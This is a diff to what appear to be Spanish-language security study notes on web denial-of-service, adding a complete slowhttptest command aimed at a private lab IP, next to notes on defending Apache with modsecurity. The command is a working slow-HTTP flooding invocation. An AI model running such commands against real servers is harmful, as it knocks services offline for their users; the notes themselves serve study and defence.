@@ -155,6 +155,10 @@ ataque DOS web
 	- sloworis
 	- slowhttprest
 
+```shell
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.142 -x 24 -p 3
+```
+
 # O)x B
 defender apache
 - modsecurity (dentro de apache)
